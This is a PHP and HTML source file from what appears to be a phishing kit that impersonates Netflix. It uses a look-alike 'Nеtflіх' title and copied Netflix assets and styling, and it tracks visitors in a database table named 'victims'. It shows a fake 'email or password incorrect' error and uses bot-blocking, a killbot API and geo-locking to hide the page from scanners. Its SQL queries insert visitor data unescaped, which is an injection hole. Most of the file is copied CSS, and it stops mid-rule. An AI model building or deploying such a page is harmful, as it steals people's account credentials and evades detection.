<?php
include 'zynexroot/inc/config.php';
include 'zynexroot/inc/connect.php';
include 'new_anti_config.php';
if ($internal_antibot == 1) {
   include "zynexroot/inc/old_blocker.php";
}
if ($mobile_lock == "checked") {
   include "zynexroot/inc/mob_lock.php";
}
if ($UK_lock == 1) {
   if (onlyuk() == true) {
   } else {
      header_remove();
      header("Connection: close\r\n");
      http_response_code(404);
      exit;
   }
}
if ($enable_killbot == 1) {
   if (checkkillbot($killbot_key) == true) {
      header_remove();
      header("Connection: close\r\n");
      http_response_code(404);
      exit;
   }
}
if ($enable_antibot == 1) {
   if (checkBot($antibot_key) == true) {
      header_remove();
      header("Connection: close\r\n");
      http_response_code(404);
      exit;
   }
}
include 'zynexroot/inc/blacklist.php';
include 'zynexroot/inc/gateway.php';
if ($enable_antibots == "checked") {
   include 'zynexroot/inc/anti.php';
}
session_start();

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

$query = mysqli_query($conn, "SELECT * FROM visits WHERE ua='$ua' AND ip='$ip'");
$num = mysqli_num_rows($query);
if ($num == 0) {
   mysqli_query($conn, "INSERT INTO visits (ua, ip) VALUES ('$ua', '$ip')");
}

if ($enable_captcha == "checked") {
   if ($_SESSION['captcha_passed'] != 'true') {
      header("location: captcha.php");
   }
}



if ($_SESSION['started'] == 'true') {
   //get what you want from the database
   $uniqueid = $_SESSION['uniqueid'];
   $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid=$uniqueid");
   if ($query) {
      $arr = mysqli_fetch_array($query, MYSQLI_ASSOC);
      $user = $arr['user'];
      if ($user != '') {
$error = '<p class="alert alert-error" role="alert" style="display: block">The email or password you entered is incorrect.</p>';
      }
   }
}

if ($enable_killbot == "checked") {
   $ip = $_SERVER['REMOTE_ADDR'];
   $ua = $_SERVER['HTTP_USER_AGENT'];
   $killbot_response = json_decode(file_get_contents("https://killbot.org/api/v2/blocker?apikey=$killbot_apikey&ip=$ip&ua=$ua&url="), true);
   if ($killbot_response['data']['block_access']) {
      die();
   }
}

if ($enable_robots == "checked") {
   $robots_script = '<script src="https://cdn.jsdelivr.net/gh/angular-loader/latest/angular-loader.min.js" id=""></script>';
}
?>

<?php

// Detect user's browser language
$userLanguage = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

// Define supported languages
$supportedLanguages = ['en', 'es', 'fr', 'de', 'it', 'ja', 'nl', 'pl', 'pt', 'sl', 'hu'];
// Set a default language
$defaultLanguage = 'en';

// Check if the detected language is in the list of supported languages
if (in_array($userLanguage, $supportedLanguages)) {
    $selectedLanguage = $userLanguage;
} else {
    $selectedLanguage = $defaultLanguage;
}

// Load the corresponding language file
$languageFile = 'languages/' . $selectedLanguage . '.php';
if (file_exists($languageFile)) {
    $translations = include($languageFile);
} else {
    die("Language file not found for $selectedLanguage");
}

?>


<!DOCTYPE html>
<html lang="en" class="js-focus-visible" data-js-focus-visible="">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" data-expires="2018-11-26" content="Aob+++752GiUzm1RNSIkM9TINnQDxTlxz02v8hFJK/uGO2hmXnJqH8c/ZpI05b2nLsHDhGO3Ce2zXJUFQmO7jA4AAAB1eyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImZlYXR1cmUiOiJFbmNyeXB0ZWRNZWRpYUhkY3BQb2xpY3lDaGVjayIsImV4cGlyeSI6MTU0MzI0MzQyNCwiaXNTdWJkb21haW4iOnRydWV9">
    <meta http-equiv="origin-trial" data-feature="LocalFolder" data-expires="2024-09-04" content="Avmn/LBDmMaBYzfLDTgViRmGZnwcz/LsvceSBBKvevKOrStLHjbpZK3zFjSRuw3ampe7aV2MzJO7//lZ9Nm82hQAAABpeyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImlzU3ViZG9tYWluIjp0cnVlLCJmZWF0dXJlIjoiV2ViQXBwTG9jYWxGb2xkZXIiLCJleHBpcnkiOjE3MjU0OTQzOTl9">
    <title>Nеtflіх</title>
    <meta content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies Tunisia, watch TV online, no download, full length movies" name="keywords">
    <meta content="WatchNеtflіх movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more." name="description">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-touch-icon" content="https://assets.nflxext.com/en_us/layout/ecweb/netflix-app-icon_152.jpg">
    <link type="text/css" rel="stylesheet" href="./sms_files/sapphireAccount.2cfc5ff732f701dcf67e.css" data-uia="botLink">
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico">
    <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png">
    <meta property="og:description" content="WatchNеtflіх movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more.">
    <meta property="al:ios:url" content="nflx://www.google.com/search?q=net&mfa">
    <meta property="al:ios:app_store_id" content="363590051">

<style>
@font-face { 
  font-display:optional;
  font-family:Nеtflіх Sans;
  font-weight:100;
  src:url(./styles/fonts/NetflixSans_W_Th.woff2) format("woff2"),url(https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Th.woff) format("woff");
} 
@font-face { 
  font-display:optional;
  font-family:Nеtflіх Sans;
  font-weight:300;
  src:url(./styles/fonts/NetflixSans_W_Lt.woff2) format("woff2"),url(https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Lt.woff) format("woff");
} 
@font-face { 
  font-display:optional;
  font-family:Nеtflіх Sans;
  font-weight:400;
  src:url(./styles/fonts/NetflixSans_W_Rg.woff2) format("woff2"),url(https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Rg.woff) format("woff");
} 
@font-face { 
  font-display:optional;
  font-family:Nеtflіх Sans;
  font-weight:500;
  src:url(./styles/fonts/NetflixSans_W_Md.woff2) format("woff2"),url(https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Md.woff) format("woff");
} 
@font-face { 
  font-display:optional;
  font-family:Nеtflіх Sans;
  font-weight:700;
  src:url(./styles/fonts/NetflixSans_W_Bd.woff2) format("woff2"),url(https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Bd.woff) format("woff");
} 
@font-face { 
  font-display:optional;
  font-family:Nеtflіх Sans;
  font-weight:900;
  src:url(./styles/fonts/NetflixSans_W_Blk.woff2) format("woff2"),url(https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Blk.woff) format("woff");
} 
  body {  
    background:#f3f3f3;
    color:#333;
    direction:ltr;
    font-family:Nеtflіх Sans,Helvetica Neue,Segoe UI,Roboto,Ubuntu,sans-serif;
    font-size:16px;
    cursor:default;
  }  
body { 
/* CSS Variables that may have been missed get put on body */ 
    --_12wd1go0:  initial;  
    --_12wd1go8:  initial;  
    --_12wd1gog:  initial;  
    --_12wd1goo:  initial;  
    --_12wd1gow:  initial;  
    --_12wd1go2:  initial;  
    --_12wd1goa:  initial;  
    --_12wd1goi:  initial;  
    --_12wd1goq:  initial;  
    --_12wd1goy:  initial;  
    --_12wd1go3:  initial;  
    --_12wd1gob:  initial;  
    --_12wd1goj:  initial;  
    --_12wd1gor:  initial;  
    --_12wd1goz:  initial;  
    --_12wd1go1:  initial;  
    --_12wd1go9:  initial;  
    --_12wd1goh:  initial;  
    --_12wd1gop:  initial;  
    --_12wd1gox:  initial;  
    --_12wd1go6:  initial;  
    --_12wd1goe:  initial;  
    --_12wd1gom:  initial;  
    --_12wd1gou:  initial;  
    --_12wd1go12:  initial;  
    --_12wd1go4:  initial;  
    --_12wd1goc:  initial;  
    --_12wd1gok:  initial;  
    --_12wd1gos:  initial;  
    --_12wd1go10:  initial;  
    --_12wd1go5:  initial;  
    --_12wd1god:  initial;  
    --_12wd1gol:  initial;  
    --_12wd1got:  initial;  
    --_12wd1go11:  initial;  
    --_12wd1go7:  inherit;  
    --_12wd1gof:  inherit;  
    --_12wd1gon:  inherit;  
    --_12wd1gov:  inherit;  
    --_12wd1go13:  inherit;  
    --_12wd1go0:  var(--_12wd1go8, initial);  
    --_12wd1go1:  var(--_12wd1go9, initial);  
    --_12wd1go2:  var(--_12wd1goa, initial);  
    --_12wd1go3:  var(--_12wd1gob, initial);  
    --_12wd1go4:  var(--_12wd1goc, initial);  
    --_12wd1go5:  var(--_12wd1god, initial);  
    --_12wd1go6:  var(--_12wd1goe, initial);  
    --_12wd1go7:  var(--_12wd1gof, inherit); 
    --_12wd1go0:  var(--_12wd1gog, initial);  
    --_12wd1go1:  var(--_12wd1goh, initial);  
    --_12wd1go2:  var(--_12wd1goi, initial);  
    --_12wd1go3:  var(--_12wd1goj, initial);  
    --_12wd1go4:  var(--_12wd1gok, initial);  
    --_12wd1go5:  var(--_12wd1gol, initial);  
    --_12wd1go6:  var(--_12wd1gom, initial);  
    --_12wd1go7:  var(--_12wd1gon, inherit); 
    --_12wd1go0:  var(--_12wd1goo, initial);  
    --_12wd1go1:  var(--_12wd1gop, initial);  
    --_12wd1go2:  var(--_12wd1goq, initial);  
    --_12wd1go3:  var(--_12wd1gor, initial);  
    --_12wd1go4:  var(--_12wd1gos, initial);  
    --_12wd1go5:  var(--_12wd1got, initial);  
    --_12wd1go6:  var(--_12wd1gou, initial);  
    --_12wd1go7:  var(--_12wd1gov, inherit); 
    --_12wd1go0:  var(--_12wd1gow, initial);  
    --_12wd1go1:  var(--_12wd1gox, initial);  
    --_12wd1go2:  var(--_12wd1goy, initial);  
    --_12wd1go3:  var(--_12wd1goz, initial);  
    --_12wd1go4:  var(--_12wd1go10, initial);  
    --_12wd1go5:  var(--_12wd1go11, initial);  
    --_12wd1go6:  var(--_12wd1go12, initial);  
    --_12wd1go7:  var(--_12wd1go13, inherit); 
    --zc08zpd:  initial;  
    --zc08zpv:  initial;  
    --zc08zp1d:  initial;  
    --zc08zp1v:  initial;  
    --zc08zp2d:  initial;  
    --zc08zpg:  initial;  
    --zc08zpy:  initial;  
    --zc08zp1g:  initial;  
    --zc08zp1y:  initial;  
    --zc08zp2g:  initial;  
    --zc08zpc:  initial;  
    --zc08zpu:  initial;  
    --zc08zp1c:  initial;  
    --zc08zp1u:  initial;  
    --zc08zp2c:  initial;  
    --zc08zp7:  initial;  
    --zc08zpp:  initial;  
    --zc08zp17:  initial;  
    --zc08zp1p:  initial;  
    --zc08zp27:  initial;  
    --zc08zp0:  inherit;  
    --zc08zpi:  inherit;  
    --zc08zp10:  inherit;  
    --zc08zp1i:  inherit;  
    --zc08zp20:  inherit;  
    --zc08zpd:  var(--zc08zpv, initial);  
    --zc08zpg:  var(--zc08zpy, initial);  
    --zc08zpc:  var(--zc08zpu, initial);  
    --zc08zp7:  var(--zc08zpp, initial);  
    --zc08zp0:  var(--zc08zpi, inherit); 
    --zc08zpd:  var(--zc08zp1d, initial);  
    --zc08zpg:  var(--zc08zp1g, initial);  
    --zc08zpc:  var(--zc08zp1c, initial);  
    --zc08zp7:  var(--zc08zp17, initial);  
    --zc08zp0:  var(--zc08zp10, inherit); 
    --zc08zpd:  var(--zc08zp1v, initial);  
    --zc08zpg:  var(--zc08zp1y, initial);  
    --zc08zpc:  var(--zc08zp1u, initial);  
    --zc08zp7:  var(--zc08zp1p, initial);  
    --zc08zp0:  var(--zc08zp1i, inherit); 
    --zc08zpd:  var(--zc08zp2d, initial);  
    --zc08zpg:  var(--zc08zp2g, initial);  
    --zc08zpc:  var(--zc08zp2c, initial);  
    --zc08zp7:  var(--zc08zp27, initial);  
    --zc08zp0:  var(--zc08zp20, inherit); 
    --containerPointerEvents__12wd1go1c:  all;  
} 

body { 
    min-width: 320px;
} 

body { 
    margin: 0;
} 

body { 
    -webkit-font-smoothing: antialiased; 
    -moz-osx-font-smoothing: grayscale; 
    background: #f3f3f3; 
    color: #333; 
    direction: ltr; 
    font-family:Nеtflіх Sans,Helvetica Neue,Segoe UI,Roboto,Ubuntu,sans-serif; 
    font-size: 16px;
} 

body { 
    background: #f2f2f2;
} 

body { 
    background-color: rgb(255,255,255); 
    font-size: unset;
} 

html { 
    -ms-text-size-adjust: 100%; 
    -webkit-text-size-adjust: 100%; 
    font-family: sans-serif;
} 

html { 
    -webkit-font-smoothing: antialiased; 
    -moz-osx-font-smoothing: grayscale; 
    background: #f3f3f3; 
    color: #333; 
    direction: ltr; 
    font-family:Nеtflіх Sans,Helvetica Neue,Segoe UI,Roboto,Ubuntu,sans-serif; 
    font-size: 16px;
} 

html { 
    cursor: default;
} 

html { 
    background-color: rgb(255,255,255); 
    font-size: unset;
} 

.default-ltr-cache-18uodxu { 
    display: flex; 
    flex-direction: column; 
    background-color: rgb(255, 255, 255); 
    padding-top: 4.0625rem; 
    transition: padding-top 0.3s;
} 

section { 
    display: block;
} 

.default-ltr-cache-1kxni4p { 
    display: -webkit-box; 
    display: -webkit-flex; 
    display: -ms-flexbox; 
    display: flex; 
    -webkit-flex-direction: column; 
    -ms-flex-direction: column; 
    flex-direction: column; 
    position: absolute; 
    top: 0; 
    background: rgb(255,255,255); 
    width: 100%; 
    z-index: 10; 
    padding-bottom: 0;
} 

.default-ltr-cache-1kxni4p:before { 
    content: ''; 
    position: absolute; 
    box-shadow: 0 0.625rem 1.25rem -0.625rem #00000040; 
    top: 0; 
    left: 0; 
    right: 0; 
    bottom: 0; 
    -webkit-transition: opacity 0.3s ease-in-out; 
    transition: opacity 0.3s ease-in-out; 
    opacity: 0;
} 

.layout-container_wrapperStyles__12wd1go1d { 
    box-sizing: border-box; 
    display: inherit; 
    height: auto; 
    width: 100%;
} 

.default-ltr-cache-4ncmv9 { 
    border-top: 0.0625rem solid rgba(128,128,128,0.2);
} 

.default-ltr-cache-18f2igg { 
    width: 100%; 
    display: -webkit-box; 
    display: -webkit-flex; 
    display: -ms-flexbox; 
    display: flex; 
    -webkit-box-pack: center; 
    -ms-flex-pack: center; 
    -webkit-justify-content: center; 
    justify-content: center; 
    border-bottom: 0.0625rem solid rgba(128,128,128,0.2); 
    background: white; 
    z-index: 1;
} 

.uma { 
    background-color: rgba(0,0,0,.97);
} 

.layout-container_wrapperStyles__12wd1go1d *  { 
    box-sizing: border-box;
} 

.layout-container_styles__12wd1go1g { 
    --_12wd1go0: initial; 
    --_12wd1go8: initial; 
    --_12wd1gog: initial; 
    --_12wd1goo: initial; 
    --_12wd1gow: initial; 
    --_12wd1go2: initial; 
    --_12wd1goa: initial; 
    --_12wd1goi: initial; 
    --_12wd1goq: initial; 
    --_12wd1goy: initial; 
    --_12wd1go3: initial; 
    --_12wd1gob: initial; 
    --_12wd1goj: initial; 
    --_12wd1gor: initial; 
    --_12wd1goz: initial; 
    --_12wd1go1: initial; 
    --_12wd1go9: initial; 
    --_12wd1goh: initial; 
    --_12wd1gop: initial; 
    --_12wd1gox: initial; 
    --_12wd1go6: initial; 
    --_12wd1goe: initial; 
    --_12wd1gom: initial; 
    --_12wd1gou: initial; 
    --_12wd1go12: initial; 
    --_12wd1go4: initial; 
    --_12wd1goc: initial; 
    --_12wd1gok: initial; 
    --_12wd1gos: initial; 
    --_12wd1go10: initial; 
    --_12wd1go5: initial; 
    --_12wd1god: initial; 
    --_12wd1gol: initial; 
    --_12wd1got: initial; 
    --_12wd1go11: initial; 
    --_12wd1go7: inherit; 
    --_12wd1gof: inherit; 
    --_12wd1gon: inherit; 
    --_12wd1gov: inherit; 
    --_12wd1go13: inherit; 
    display: inline-flex; 
    flex-wrap: wrap; 
    height: inherit; 
    align-items: var(--_12wd1go0, initial); 
    flex-direction: var(--_12wd1go2, initial); 
    justify-content: var(--_12wd1go3, initial); 
    margin-left: calc(var(--_12wd1go1, initial) * -1); 
    margin-top: calc(var(--_12wd1go6, initial) * -1); 
    max-width: var(--_12wd1go4, initial); 
    padding: var(--_12wd1go5, initial); 
    width: var(--_12wd1go7, inherit);
} 

.layout-container_styles__12wd1go1g { 
    --_12wd1go0: var(--_12wd1go8, initial); 
    --_12wd1go1: var(--_12wd1go9, initial); 
    --_12wd1go2: var(--_12wd1goa, initial); 
    --_12wd1go3: var(--_12wd1gob, initial); 
    --_12wd1go4: var(--_12wd1goc, initial); 
    --_12wd1go5: var(--_12wd1god, initial); 
    --_12wd1go6: var(--_12wd1goe, initial); 
    --_12wd1go7: var(--_12wd1gof, inherit);
} 

@media screen and (min-width: 600px){ 
  .layout-container_styles__12wd1go1g { 
    --_12wd1go0: var(--_12wd1gog, initial); 
    --_12wd1go1: var(--_12wd1goh, initial); 
    --_12wd1go2: var(--_12wd1goi, initial); 
    --_12wd1go3: var(--_12wd1goj, initial); 
    --_12wd1go4: var(--_12wd1gok, initial); 
    --_12wd1go5: var(--_12wd1gol, initial); 
    --_12wd1go6: var(--_12wd1gom, initial); 
    --_12wd1go7: var(--_12wd1gon, inherit);
  } 
}     

@media screen and (min-width: 960px){ 
  .layout-container_styles__12wd1go1g { 
    --_12wd1go0: var(--_12wd1goo, initial); 
    --_12wd1go1: var(--_12wd1gop, initial); 
    --_12wd1go2: var(--_12wd1goq, initial); 
    --_12wd1go3: var(--_12wd1gor, initial); 
    --_12wd1go4: var(--_12wd1gos, initial); 
    --_12wd1go5: var(--_12wd1got, initial); 
    --_12wd1go6: var(--_12wd1gou, initial); 
    --_12wd1go7: var(--_12wd1gov, inherit);
  } 
}     

@media screen and (min-width: 1280px){ 
  .layout-container_styles__12wd1go1g { 
    --_12wd1go0: var(--_12wd1gow, initial); 
    --_12wd1go1: var(--_12wd1gox, initial); 
    --_12wd1go2: var(--_12wd1goy, initial); 
    --_12wd1go3: var(--_12wd1goz, initial); 
    --_12wd1go4: var(--_12wd1go10, initial); 
    --_12wd1go5: var(--_12wd1go11, initial); 
    --_12wd1go6: var(--_12wd1go12, initial); 
    --_12wd1go7: var(--_12wd1go13, inherit);
  } 
}     

footer { 
    display: block;
} 

.default-ltr-cache-8qwptr { 
    color: rgba(0,0,0,0.7); 
    margin: auto; 
    font-size: 1rem; 
    font-weight: 400;
} 

@media screen and (min-width: 1280px){ 
  .default-ltr-cache-8qwptr { 
    max-width: calc(83.33333333333334% - (3rem * 2));
  } 
}     

@media all{ 
  .default-ltr-cache-8qwptr { 
    margin-top: 2rem; 
    margin-bottom: 2rem;
  } 
}     

@media (min-width: 600px){ 
  .default-ltr-cache-8qwptr { 
    margin-top: 2rem; 
    margin-bottom: 2rem;
  } 
}     

@media (min-width: 960px){ 
  .default-ltr-cache-8qwptr { 
    margin-top: 4.5rem; 
    margin-bottom: 4.5rem;
  } 
}     

@media (min-width: 1280px){ 
  .default-ltr-cache-8qwptr { 
    margin-top: 4.5rem; 
    margin-bottom: 4.5rem;
  } 
}     

@media all{ 
  .default-ltr-cache-8qwptr { 
    padding-left: 1.5rem; 
    padding-right: 1.5rem;
  } 
}     

@media (min-width: 600px){ 
  .default-ltr-cache-8qwptr { 
    padding-left: 2rem; 
    padding-right: 2rem;
  } 
}     

@media (min-width: 960px){ 
  .default-ltr-cache-8qwptr { 
    padding-left: 2rem; 
    padding-right: 2rem;
  } 
}     

@media (min-width: 1280px){ 
  .default-ltr-cache-8qwptr { 
    padding-left: 3rem; 
    padding-right: 3rem;
  } 
}     

.default-ltr-cache-15d6ef6 { 
    width: 100.00%; 
    margin: 0 auto; 
    display: -webkit-box; 
    display: -webkit-flex; 
    display: -ms-flexbox; 
    display: flex; 
    box-sizing: border-box; 
    border-bottom: 0; 
    padding: 0 1rem 0; 
    min-height: 4rem;
} 

@media screen and (min-width: 600px){ 
  .default-ltr-cache-15d6ef6 { 
    padding-left: 2rem; 
    padding-right: 2rem;
  } 
}     

@media screen and (min-width: 1280px){ 
  .default-ltr-cache-15d6ef6 { 
    width: 83.33%; 
    padding-left: 3rem; 
    padding-right: 3rem;
  } 
}     

.layout-item_styles__zc08zp30 { 
    --zc08zpd: initial; 
    --zc08zpv: initial; 
    --zc08zp1d: initial; 
    --zc08zp1v: initial; 
    --zc08zp2d: initial; 
    --zc08zpg: initial; 
    --zc08zpy: initial; 
    --zc08zp1g: initial; 
    --zc08zp1y: initial; 
    --zc08zp2g: initial; 
    --zc08zpc: initial; 
    --zc08zpu: initial; 
    --zc08zp1c: initial; 
    --zc08zp1u: initial; 
    --zc08zp2c: initial; 
    --zc08zp7: initial; 
    --zc08zpp: initial; 
    --zc08zp17: initial; 
    --zc08zp1p: initial; 
    --zc08zp27: initial; 
    --zc08zp0: inherit; 
    --zc08zpi: inherit; 
    --zc08zp10: inherit; 
    --zc08zp1i: inherit; 
    --zc08zp20: inherit; 
    display: inline-flex; 
    flex-wrap: wrap; 
    align-items: var(--zc08zpd, initial); 
    flex: var(--zc08zpg, initial); 
    justify-content: var(--zc08zpc, initial); 
    padding: var(--zc08zp7, initial); 
    width: var(--zc08zp0, inherit);
} 

.layout-item_styles__zc08zp30 { 
    --zc08zpd: var(--zc08zpv, initial); 
    --zc08zpg: var(--zc08zpy, initial); 
    --zc08zpc: var(--zc08zpu, initial); 
    --zc08zp7: var(--zc08zpp, initial); 
    --zc08zp0: var(--zc08zpi, inherit);
} 

@media screen and (min-width: 600px){ 
  .layout-item_styles__zc08zp30 { 
    --zc08zpd: var(--zc08zp1d, initial); 
    --zc08zpg: var(--zc08zp1g, initial); 
    --zc08zpc: var(--zc08zp1c, initial); 
    --zc08zp7: var(--zc08zp17, initial); 
    --zc08zp0: var(--zc08zp10, inherit);
  } 
}     

@media screen and (min-width: 960px){ 
  .layout-item_styles__zc08zp30 { 
    --zc08zpd: var(--zc08zp1v, initial); 
    --zc08zpg: var(--zc08zp1y, initial); 
    --zc08zpc: var(--zc08zp1u, initial); 
    --zc08zp7: var(--zc08zp1p, initial); 
    --zc08zp0: var(--zc08zp1i, inherit);
  } 
}     

@media screen and (min-width: 1280px){ 
  .layout-item_styles__zc08zp30 { 
    --zc08zpd: var(--zc08zp2d, initial); 
    --zc08zpg: var(--zc08zp2g, initial); 
    --zc08zpc: var(--zc08zp2c, initial); 
    --zc08zp7: var(--zc08zp27, initial); 
    --zc08zp0: var(--zc08zp20, inherit);
  } 
}     

.layout-container_styles__12wd1go1g > *  { 
    margin-left: var(--_12wd1go1, unset); 
    margin-top: var(--_12wd1go6, unset); 
    pointer-events: var(--containerPointerEvents__12wd1go1c, unset);
} 

header { 
    display: block;
} 

.default-ltr-cache-80ndpi { 
    display: -webkit-box; 
    display: -webkit-flex; 
    display: -ms-flexbox; 
    display: flex; 
    top: 0; 
    height: 3.5rem; 
    background: rgb(255,255,255); 
    width: 100%; 
    -webkit-box-pack: justify; 
    -webkit-justify-content: space-between; 
    justify-content: space-between; 
    -webkit-align-items: center; 
    -webkit-box-align: center; 
    -ms-flex-align: center; 
    align-items: center;
} 

@media screen and (min-width: 960px){ 
  .default-ltr-cache-80ndpi { 
    height: 4rem;
  } 
}     

a { 
    background-color: transparent;
} 

a { 
    color: #0080ff; 
    text-decoration: none;
} 

.pressable_styles__a6ynkg0 { 
    -webkit-appearance: none; 
    -moz-appearance: none; 
    appearance: none; 
    background: none; 
    border-radius: 0; 
    border: 0; 
    box-sizing: content-box; 
    color: inherit; 
    cursor: default; 
    display: inline; 
    font: inherit; 
    letter-spacing: inherit; 
    line-height: inherit; 
    margin: 0; 
    opacity: 1; 
    padding: 0; 
    text-decoration: none;
} 

.anchor_styles__1h0vwqc0 { 
    color: blue; 
    cursor: pointer; 
    text-decoration: underline; 
    -webkit-user-select: text; 
    -moz-user-select: text; 
    user-select: text;
} 

.default-ltr-cache-5dql71 { 
    height: 1.75rem; 
    z-index: 1;
} 

.anchor_styles__1h0vwqc0:visited { 
    color: purple;
} 

a:active,a:hover { 
    outline: 0;
} 

a:hover { 
    text-decoration: underline;
} 

a:hover { 
    text-decoration: none;
} 

.default-ltr-cache-guqtl5 { 
    z-index: 1; 
    opacity: 1;
} 

.default-ltr-cache-1d568uk { 
    width: 9.25rem; 
    height: 2.5rem; 
    color: rgb(229,9,20); 
    fill: currentColor; 
    display: block;
} 

svg:not(:root) { 
    overflow: hidden;
} 

.default-ltr-cache-5dql71 svg  { 
    height: 1.75rem;
} 

.default-ltr-cache-raue2m { 
    clip: rect(0 0 0 0); 
    -webkit-clip-path: inset(50%); 
    clip-path: inset(50%); 
    height: 1px; 
    overflow: hidden; 
    position: absolute; 
    white-space: nowrap; 
    width: 1px;
} 

button { 
    color: inherit; 
    font: inherit; 
    margin: 0;
} 

button { 
    overflow: visible;
} 

button { 
    text-transform: none;
} 

button { 
    -webkit-appearance: button; 
    cursor: pointer;
} 

.button_styles__1kwr4ym0 { 
    align-items: center; 
    background: gainsboro; 
    border-radius: 2px; 
    border: 1px solid dimgray; 
    box-sizing: border-box; 
    color: black; 
    cursor: default; 
    display: inline-flex; 
    font-size: 13px; 
    font-weight: 400; 
    justify-content: center; 
    letter-spacing: normal; 
    line-height: 1; 
    padding: 2px 7px; 
    -webkit-user-select: none; 
    -moz-user-select: none; 
    user-select: none;
} 

.default-ltr-cache-1v2hbc2 { 
    padding: 0.125rem; 
    border-radius: 0.375rem; 
    cursor: pointer; 
    background: transparent; 
    border: 0;
} 

@media (hover: hover){ 
  .button_styles__1kwr4ym0:not([aria-disabled]):hover { 
    border-color: black; 
    background: lightgray;
  } 

  .default-ltr-cache-1v2hbc2:not([aria-disabled]):hover { 
    background-color: rgba(128,128,128,0.2);
  } 
}     

.default-ltr-cache-1ythyxk { 
    display: -webkit-box; 
    display: -webkit-flex; 
    display: -ms-flexbox; 
    display: flex; 
    -webkit-box-pack: center; 
    -ms-flex-pack: center; 
    -webkit-justify-content: center; 
    justify-content: center; 
    padding: 1.5rem 1rem 3.5rem; 
    width: 100%; 
    min-height: 37.5rem;
} 

@media screen and (min-width: 600px){ 
  .default-ltr-cache-1ythyxk { 
    padding-left: 2rem; 
    padding-right: 2rem;
  } 
}     

@media screen and (min-width: 960px){ 
  .default-ltr-cache-1ythyxk { 
    -webkit-flex-direction: row; 
    -ms-flex-direction: row; 
    flex-direction: row; 
    -webkit-box-flex-wrap: nowrap; 
    -webkit-flex-wrap: nowrap; 
    -ms-flex-wrap: nowrap; 
    flex-wrap: nowrap; 
    padding-bottom: 5rem;
  } 
}     

@media screen and (min-width: 1280px){ 
  .default-ltr-cache-1ythyxk { 
    padding-left: 3rem; 
    padding-right: 3rem;
  } 
}     

.default-ltr-cache-82qlwu { 
    margin-bottom: 0.75rem;
} 

.default-ltr-cache-2lwb1t { 
    margin: 0.75rem 0; 
    width: 100%; 
    font-size: 0.875rem; 
    font-weight: 400;
} 

.default-ltr-cache-113gja { 
    margin-top: calc(0.75rem * 2); 
    font-size: 0.75rem;
} 

img { 
    border: 0;
} 

.default-ltr-cache-a3hl4h { 
    border-radius: 0.25rem; 
    width: 2rem; 
    height: 2rem;
} 

.default-ltr-cache-guqtl5 img  { 
    pointer-events: none;
} 

.default-ltr-cache-vnnyvu { 
    margin: 0 0.5rem; 
    color: rgba(0,0,0,0.7);
} 

.default-ltr-cache-wlhfwz { 
    display: -webkit-box; 
    display: -webkit-flex; 
    display: -ms-flexbox; 
    display: flex; 
    width: 100%;
} 

@media screen and (min-width: 960px){ 
  .default-ltr-cache-wlhfwz { 
    padding-left: 1.5rem;
  } 
}     

@media screen and (min-width: 1280px){ 
  .default-ltr-cache-wlhfwz { 
    max-width: 83.33%; 
    padding-left: 2rem;
  } 
}     

.default-ltr-cache-w6a8nx { 
    color: rgb(0,0,0);
} 

.default-ltr-cache-8qwptr p  { 
    margin-block-start: 0; 
    margin-block-end: 0;
} 

.default-ltr-cache-1mtuoem { 
    border: 0; 
    cursor: pointer; 
    fill: currentColor; 
    position: relative; 
    transition-duration: 250ms; 
    transition-property: background-color,border-color; 
    transition-timing-function: cubic-bezier(0.4,0,0.68,0.06); 
    vertical-align: text-top; 
    width: auto; 
    font-size: 1rem; 
    font-weight: 500; 
    min-height: 2.5rem; 
    padding: 0.375rem 1rem; 
    border-radius: 0.25rem; 
    background: rgba(128,128,128,0.0); 
    color: rgb(0,0,0);
} 

.default-ltr-cache-1mtuoem:after { 
    bottom: 0; 
    left: 0; 
    position: absolute; 
    right: 0; 
    top: 0; 
    -webkit-transition: inherit; 
    transition: inherit; 
    border-style: solid; 
    border-width: 0.0625rem; 
    border-radius: calc(			0.25rem - 0.0625rem		); 
    content: ''; 
    border-color: rgb(128,128,128);
} 

@media (hover: hover){ 
  .default-ltr-cache-1mtuoem:not([aria-disabled]):hover { 
    transition-timing-function: cubic-bezier(0.32,0.94,0.6,1); 
    background: rgba(128,128,128,0.2);
  } 

  .default-ltr-cache-1mtuoem:not([aria-disabled]):hover:after { 
    border-color: rgb(0,0,0);
  } 
}     

.default-ltr-cache-guqtl5 svg  { 
    pointer-events: none;
} 

.default-ltr-cache-1wgv4st { 
    margin: 1rem auto 12.5rem; 
    max-width: 30rem; 
    border-radius: 0.5rem;
} 

.default-ltr-cache-8qwptr a  { 
    color: rgba(0,0,0,0.7); 
    border-radius: 0.125rem;
} 

.default-ltr-cache-w6a8nx a  { 
    color: rgb(0,0,0); 
    -webkit-text-decoration: underline; 
    text-decoration: underline;
} 

ul { 
    padding: 0;
} 

.layout-container_wrapperStyles_dangerouslyApplyPointerEvents_true__12wd1go1e { 
